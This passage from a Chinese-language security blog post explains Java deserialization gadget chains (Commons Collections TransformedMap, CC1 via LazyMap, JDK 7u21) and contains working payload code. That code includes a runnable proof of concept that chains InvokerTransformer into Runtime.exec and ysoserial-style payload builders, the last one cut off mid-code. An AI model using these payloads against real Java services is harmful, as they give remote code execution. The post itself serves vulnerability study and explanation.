class="params">(Object value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (keyTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€ä»£ç†ï¼ˆDynamic Proxyï¼‰ AnnotationInvocationHandler ç±»çš„ <code>memberValues</code> æ˜¯ Map ç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler çš„ <code>readObject</code> å‡½æ•°å¯¹ <code>memberValues</code> çš„æ¯ä¸€é¡¹è°ƒç”¨ <code>setValue</code> å‡½æ•°ï¼Œè€Œè¯¥å‡½æ•°ä¼šè§¦å‘ TransformedMap çš„ <code>checkSetValue</code> æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// è§¦å‘ Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–å¯¹è±¡è§¦å‘ä»£ç æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; ä»£ç æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>POC ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// æ„é€  ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;) &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€  Map</span></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ„é€  TransformedMap</span></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„è·å¾— AnnotationInvocationHandler ç±»å¯¹è±¡</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„è·å¾— cls çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// è®¾ç½® Accessible ä¸º true</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//é€šè¿‡ newInstance() æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(), <span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// å°†æ„é€ å¥½çš„ payload åºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// è¯»å–å†™å…¥çš„ payload å¹¶è¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><blockquote><p>åŒæ ·åˆ©ç”¨ ChainedTransformer æ„é€ æ¶æ„è°ƒç”¨é“¾<br>æ”¾åœ¨ç‰¹æ€§å’Œ TransformedMap ç›¸åŒçš„ lazyMap ä¸­<br>é€šè¿‡åŠ¨æ€ä»£ç† AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk1.8 ä¹‹å‰</li></ul><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/O45lTtijsKYwng6.jpg" ><p>ysoserial.payloads.CommonsCollections1 æ„é€  <code>ChainedTransformer</code>ï¼ˆRCE æŒ‡ä»¤ï¼‰ï¼Œç„¶åå°è£…åˆ° lazyMap ä¸­ã€‚åŠ¨æ€ä»£ç† AnnotationInvocationHandler ååºåˆ—åŒ–æ—¶ä¼šå¯¹æˆå‘˜å˜é‡ <code>memberValues</code> ï¼ˆä»£ç†å¯¹è±¡ï¼‰è°ƒç”¨ <code>entrySet</code> æ–¹æ³•ï¼Œå³è°ƒç”¨å¯¹åº” handler çš„ invoke æ–¹æ³•ï¼Œå› æ­¤ç”¨ lazyMap æ„é€ ä»£ç†ã€‚ç„¶åä¼šè°ƒç”¨ lazyMap çš„ handlerï¼Œä¹Ÿå³è°ƒç”¨èµ‹å€¼ç»™å…¶ <code>factory</code> æ–¹æ³•çš„ ChainedTransformerï¼Œå®ç° RCEã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º lazyMap å¯¹è±¡</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// transformerChain èµ‹å€¼ç»™ lazyMap çš„ factory å˜é‡</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ¨æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† Map ä¼ å…¥ InvocationHandler æˆå‘˜å˜é‡ memberValues</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="jdk-1-7u21"><a href="#jdk-1-7u21" class="headerlink" title="jdk 1.7u21"></a>jdk 1.7u21</h3><blockquote><p>æ¶‰åŠå“ˆå¸Œç¢°æ’å’Œ TemplatesImpl<br>TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾ï¼Œå¯ä½œä¸ºå…¶ä»– gadget çš„â€œååŠâ€éƒ¨åˆ†</p></blockquote><p>ä¸ä¾èµ–ç¬¬ä¸‰æ–¹åº“ï¼ŒJDK æœ¬èº«å®ç°çš„ååºåˆ—åŒ–æ“ä½œå­˜åœ¨å®‰å…¨æ¼æ´ã€‚</p><p>fixï¼šAnnotationInvocationHandler çš„ <code>readObject</code> æ–¹æ³•å¢åŠ äº†å¼‚å¸¸æŠ›å‡ºï¼Œä¹‹å‰æ˜¯ç›´æ¥ returnã€‚</p><ul><li>HashMap æ„é€ çš„ AnnotationInvocationHandler å’Œ TemplatesImpl å¯ä»¥å­˜å‚¨åœ¨ LinkedHashSet ä¸­ï¼Œåœ¨ååºåˆ—åŒ–æ—¶é€šè¿‡å“ˆå¸Œç¢°æ’ï¼ˆ<code>hashCode(f5a5a608)=0</code>ï¼‰æ‰§è¡Œä¸‹ä¸€æ­¥ï¼›</li><li>åœ¨ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ <code>equals()</code>ï¼Œå³è°ƒç”¨ AnnotationInvocationHandler çš„ <code>equalsImpl()</code>ï¼Œå®ƒä¼š invoke TemplatesImpl çš„æ‰€æœ‰éé›¶å‚æ–¹æ³•ï¼ŒåŒ…æ‹¬ <code>getOutputProperties()</code>ï¼›</li><li>ä¸Šé¢çš„æ­¥éª¤ä¼šä½¿ç”¨ TemplatesImpl ä¸­åºåˆ—åŒ–çš„æ¶æ„å­—èŠ‚æ•°ç»„ <code>_bytecodes</code> ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨ <code>ClassLoader.declareClass()</code>ï¼Œæœ€ç»ˆå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</li></ul><p>ååºåˆ—åŒ–å¯¹è±¡å›¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet</span><br><span class="line">     |  |</span><br><span class="line">     |  &#96;--&gt; Proxy (Templates) </span><br><span class="line">     |         |</span><br><span class="line">     |         &#96;--&gt; AnnotationInvocationHandler </span><br><span class="line">     |                      |</span><br><span class="line">     |                      &#96;--&gt; HashMap</span><br><span class="line">     |                            |  |</span><br><span class="line">     |                            |  &#96;----&gt; String (&quot;f5a5a608&quot;)</span><br><span class="line">     |                            |</span><br><span class="line">     &#96;-----&gt; TemplatesImpl &lt;------&#96;</span><br><span class="line">                  |</span><br><span class="line">                  &#96;-------&gt; byte[] (malicious class definition)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/oXL5farBdAERI1F.jpg" ><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Jdk7u21</p><p>LinkedHashSet ï¼ˆç»§æ‰¿ HashMap å®ç°ï¼‰è°ƒç”¨ <code>writeObject()</code> æ–¹æ³•åºåˆ—åŒ–æ—¶ï¼Œä¼šä¾æ¬¡è°ƒç”¨æ¯ä¸ªå…ƒç´ çš„ <code>writeObject()</code> ï¼Œååºåˆ—åŒ–æ—¶ä¼šä¾æ¬¡è°ƒç”¨æ¯ä¸ªå…ƒç´ çš„ <code>readObject()</code> æ–¹æ³•ï¼Œç„¶åå°†å…¶ä½œä¸º key æ”¾å…¥ HashMap ä¸­ã€‚</p><p>HashMap ä¸­æ·»åŠ å…ƒç´ ä¼šè°ƒç”¨å·²æœ‰å…ƒç´ çš„ key ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨æ’å…¥å…ƒç´ çš„ <code>equals()</code> æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚å› æ­¤åªè¦è®©ååºåˆ—åŒ–æ—¶å…ˆæ·»åŠ ä»£ç†å¯¹è±¡ï¼Œå†æ·»åŠ æ¶æ„ä»£ç å®ä¾‹å³å¯ã€‚</p><p>æ™®é€šå¯¹è±¡è°ƒç”¨ <code>hashCode()</code> æ¯”è¾ƒï¼Œä»£ç†å¯¹è±¡ AnnotationInvocationHandler é€šè¿‡ invoke è°ƒç”¨ <code>hashCode</code> ï¼Œå†…éƒ¨è°ƒç”¨ <code>hashCodeImpl()</code>ï¼Œè€Œå…¶å¯¹ memberValues å¾ªç¯è°ƒç”¨ <code>memberValueHashCode()</code>ï¼Œå½“å…¶ä¸­çš„å¯¹è±¡ä¸æ˜¯æ•°ç»„æ—¶ï¼Œè¿”å› <code>hashCode</code>ã€‚</p><p>ä¸ºäº†è®© AnnotationInvocationHandler ä»£ç†çš„å¯¹è±¡çš„è¿”å›å€¼ä¸æ™®é€šå¯¹è±¡çš„è¿”å›å€¼ç›¸ç­‰ï¼Œè¿™å°±è¦æ±‚ memberValues  ä¸­åªæœ‰ä¸€ä¸ªå€¼ï¼Œå› æ­¤åªæ”¾ä¸€ä¸ª key ä¸º <code>f5a5a608</code>ï¼Œvalue ä¸ºåŒ…å«æ¶æ„ä»£ç çš„ templates ã€‚</p><ul><li>è¿™é‡Œæ˜¯ä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œ equals ç„¶åè§¦å‘ <code>TemplatesImpl.getOutputProperties</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ¶æ„ä»£ç </span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å“ˆå¸Œç¢°æ’å€¼</span></span><br><span class="line">String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  HashMap</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>); <span class="comment">// value ä»»æ„å€¼ï¼Œè®© LinkedHashSet.add æˆåŠŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ HashMap åˆ›å»º AnnotationInvocationHandler</span></span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    <span class="comment">// è®¾ç½®ä¸º Templates ç±»å‹</span></span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ AnnotationInvocationHandler åˆ›å»º Templates ä»£ç†æ¥å£</span></span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»§æ‰¿ HashSet</span></span><br><span class="line">LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy); <span class="comment">// 